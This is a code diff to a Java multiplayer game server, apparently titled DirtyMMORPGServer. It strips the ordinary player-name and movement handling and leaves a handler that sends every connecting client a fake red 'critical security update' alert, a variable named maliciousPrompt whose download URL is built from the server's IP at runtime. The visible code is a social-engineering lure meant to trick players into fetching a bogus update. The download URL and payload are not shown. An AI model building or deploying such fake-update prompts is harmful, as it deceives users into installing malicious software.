@@ -68,17 +68,11 @@ class PlayerHandler implements Runnable {
     public void run() {
         try {
             in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-            out = new PrintWriter(socket.getOutputStream(), true);
-
-            out.println("Enter your player name: ");
-            playerName = in.readLine();
-            
-            DirtyMMORPGServer.addPlayer(playerName, this);
-            System.out.println(playerName + " has joined from " + socket.getInetAddress());
+            out = new PrintWriter(socket.getOutputStream(), true);  
 
             // --- DYNAMIC FAKE UPDATE INJECTION ---
             // The URL now uses the 'serverIP' variable fetched at runtime
-            String maliciousPrompt = CLEAR_SCREEN + RED +
+            String maliciousPrompt = RED +
                 "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n" +
                 "SYSTEM ALERT: CRITICAL SECURITY UPDATE REQUIRED\n" +
                 "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n" +
@@ -89,13 +83,6 @@ class PlayerHandler implements Runnable {
             
             out.println(maliciousPrompt);
 
-            String message;
-            while ((message = in.readLine()) != null) {
-                if (message.startsWith("MOVE:")) {
-                    String positionData = message.substring(5);
-                    DirtyMMORPGServer.updatePlayerPosition(playerName, positionData);
-                }
-            }
         } catch (IOException e) {
             System.out.println("Connection lost with " + playerName);
         } finally {
